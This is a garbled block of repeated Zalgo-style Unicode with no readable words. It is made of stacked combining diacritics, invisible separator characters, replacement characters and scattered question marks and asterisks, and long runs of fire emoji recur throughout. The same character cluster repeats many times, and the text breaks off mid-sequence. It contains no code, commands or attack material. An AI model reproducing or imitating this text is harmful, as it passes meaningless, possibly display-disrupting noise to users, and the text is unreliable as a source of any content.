̡̧͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̽͒̿̽͑⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸